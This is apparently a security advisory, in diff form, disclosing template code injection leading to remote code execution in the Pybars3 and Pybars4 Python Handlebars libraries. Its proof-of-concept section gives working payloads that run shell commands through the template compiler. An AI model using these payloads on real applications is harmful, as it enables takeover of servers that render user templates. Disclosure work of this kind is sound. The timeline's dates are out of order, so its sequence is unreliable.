@@ -1,0 +1,107 @@
+# Code Injection in Pybars3 and Pybars4 leading to RCE
+
+- CVE ID: N/A
+- CVSS3.1 vector: AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+- CVSS3.1 score: 9.8 (Critical)
+- CWE-94: Improper Control of Generation of Code ('Code Injection')
+- CWE-1336: Improper Neutralization of Special Elements Used in a Template Engine
+
+### Summary:
+
+**Pybars3** at least up to the current version **0.9.7** and **Pybars4** at least up to the current version **0.9.13** are vulnerable to Code Injection.
+An attacker controlling the template string can achieve arbitrary code execution without any additional requirements.
+
+### Details:
+
+**Pybars3** at least up to the current version **0.9.7** and Pybars4 at least up to the current version **0.9.13** are vulnerable to code injection using `[...]` syntax.
+The `[...]` syntax is used to provide data keys containing special characters, but it is not properly escaped when inserted into the generated code inside the single-quoted string.
+This allows a malicious attacker controlling the template string to achieve arbitrary code execution.
+
+**Pybars3** and **Pybars4** are Python implementations of **Handlebars**, which is often considered safe to work with user-supplied templates.
+**Pybars3** is mentioned in the **Handlebars** documentation as a Python implementation of **Handlebars**. [^1]
+
+Original **Pybars** lacks `[...]` syntax and is **NOT** affected by this vulnerability.
+JavaScript **Handlebars** and other independent implementations are **NOT** affected by this vulnerability.
+
+### Proof of Concept / Exploit:
+
+Template to achieve RCE and execute `id` in shell:
+
+```handlebars
+{{#with ['+__import__('os').popen('id').read()+']}}{{/with}}
+```
+
+PoC that outputs the results inside the template:
+
+```python
+from pybars import Compiler
+compiler = Compiler()
+compiler.compile("{{#with ['+str(result.append(__import__('os').popen('id').read()))+']}}{{/with}}")({})
+```
+
+PoC to output the generated code and verify the injection point:
+
+```python
+from pybars import Compiler
+compiler = Compiler()
+print(compiler.precompile("{{#with ['+str(result.append(__import__('os').popen('id').read()))+']}}{{/with}}"))
+```
+
+### Impact:
+
+An attacker can execute arbitrary code in the context of the Python application.
+
+### Affected software:
+
+- **Pybars3**: at least up to the current version **0.9.7**
+- **Pybars4**: at least up to the current version **0.9.13**
+
+### Fixed in:
+
+- **Pybars3**: fix not provided
+- **Pybars4**: fix not provided
+
+### Recommendation for maintainer:
+
+- Add proper escaping of strings in the generated code
+
+### Recommendation for users:
+
+- Use WAF/filtering to block code execution payloads
+- Consider using **non-evaling** template engine
+
+### Rationale for CVSS assessment:
+
+- Attack Vector: Network
+> No network requirements are present for exploitation.
+> Templating functionality is often provided on public websites.
+- Attack Complexity: Low
+> Attacker can expect reliable and repeatable exploitation.
+> There are no requirements beyond attacker's control.
+- Privileges Required: None
+> Pybars3 and Pybars4 provide no privilege managment or other similar restrictions.
+> Handlebars (which pybars3 and pybars4 are implementations of) is often used for untrusted user-supplied templates.
+> Exploitation is often possible without authorization or by using self-registered accounts.
+- User Interaction: None
+> Exploitation does not require any user interaction to achieve RCE.
+- Scope: Unchanged
+> The code is executed with the same privileges as the web application, without changing the scope.
+- Confidentiality Impact: High
+> Arbitrary code execution leads to the total loss of confidentiality.
+- Integrity Impact: High
+> Arbitrary code execution leads to the total loss of integrity.
+- Availability Impact: High
+> Arbitrary code execution can be used to achieve the total loss of availability.
+
+### Timeline:
+
+- 14.06.2026 - Vulnerability discovered, first attempt to contact maintainer of **Pybars3**
+- 22.06.2026 - Second attempt to contact maintainer of **Pybars3**
+- 01.07.2026 - Third attempt to contact maintainer of **Pybars3**
+- 15.07.2026 - **Pybars4** was tested and confirmed to be affected, first attempt to contact maintainer of **Pybars4**
+- 20.07.2026 - Second attempt to contact maintainer of **Pybars4**
+- 03.07.2026 - Public disclosure announced, SHA-256 hash of this advisory published
+- 10.07.2026 - Public disclosure, CVE request
+
+### References
+[^1]: https://handlebarsjs.com/guide/installation/#other-programming-languages
